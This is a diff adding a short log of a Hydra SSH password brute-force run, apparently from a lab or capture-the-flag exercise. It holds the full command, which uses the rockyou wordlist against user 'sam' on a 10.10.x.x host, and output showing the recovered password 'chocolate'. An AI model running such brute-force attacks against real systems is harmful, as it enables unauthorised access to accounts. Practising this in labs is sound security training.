@@ -1,0 +1,10 @@
+$ hydra -l sam -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt ssh://10.10.222.142:4567
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2021-06-28 14:23:38
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://10.10.222.142:4567/
+
+[4567][ssh] host: 10.10.222.142   login: sam   password: chocolate
+1 of 1 target successfully completed, 1 valid password found
